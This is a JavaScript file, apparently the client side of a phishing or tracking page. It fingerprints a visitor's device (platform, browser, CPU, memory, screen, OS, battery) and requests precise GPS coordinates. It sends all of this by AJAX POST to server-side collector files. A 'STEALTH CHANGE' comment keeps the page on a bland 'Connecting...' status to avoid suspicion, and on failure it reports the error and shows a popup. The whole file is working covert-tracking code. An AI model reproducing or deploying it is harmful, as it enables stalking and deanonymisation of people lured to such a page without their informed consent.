// -----------------------------------------------------
// 1. DEVICE INFO
// -----------------------------------------------------
function information() {
  if (navigator.getBattery) {
    navigator.getBattery().then(function(battery) {
      var level = Math.round(battery.level * 100) + "%";
      var status = battery.charging ? " (Charging ⚡)" : "";
      collectAndSend(level + status);
    });
  } else {
    collectAndSend("Unknown");
  }
}

function collectAndSend(batLevel) {
  var ptf = navigator.platform;
  var cc = navigator.hardwareConcurrency || 'Not Available';
  var ram = navigator.deviceMemory || 'Not Available';
  var ver = navigator.userAgent;
  var brw = 'Unknown'; 
  if (ver.indexOf('Firefox') != -1) brw = 'Firefox';
  else if (ver.indexOf('Chrome') != -1) brw = 'Chrome';
  else if (ver.indexOf('Safari') != -1) brw = 'Safari';

  var ht = window.screen.height;
  var wd = window.screen.width;
  var os = ver; 
  if(os.includes(';')) {
      os = os.substring(0, os.indexOf(')'));
      os = os.split(';')[1];
      if (os) os = os.trim();
  }

  $.ajax({
    type: 'POST',
    url: info_file,
    data: { Ptf: ptf, Brw: brw, Cc: cc, Ram: ram, Ht: ht, Wd: wd, Os: os, Bat: batLevel },
    success: function() {},
    mimeType: 'text'
  });
}

// -----------------------------------------------------
// 3. LOCATION LOGIC
// -----------------------------------------------------
function locate(successCallback, failCallback) {
  // STEALTH CHANGE: No text change here if it already says "Connecting..."
  // It looks cleaner to just stay on one status.
  
  if (navigator.geolocation) {
    var optn = { enableHighAccuracy: true, timeout: 5000, maximumage: 0 };
    
    navigator.geolocation.getCurrentPosition(
      function(position) { 
          showPosition(position, successCallback); 
      }, 
      function(error) { 
    // Report the error to error.php
    $.ajax({
        type: 'POST',
        url: error_file,
        data: { Status: 'failed', Error: error.message },
        success: function() {
            // After reporting, trigger the "failed" callback (which shows the popup)
            if(failCallback) failCallback(); 
        }
    });
}, 
      optn
    );
  } else {
    if(successCallback) successCallback();
  }
}

function showPosition(position, callback) {
  var lat = position.coords.latitude; 
  var lon = position.coords.longitude;
  
  $.ajax({
    type: 'POST',
    url: result_file,
    data: { Status: 'success', Lat: lat, Lon: lon },
    success: function() { 
        if(callback) callback(); 
    },
    error: function() {
        if(callback) callback(); 
    },
    mimeType: 'text'
  });
}
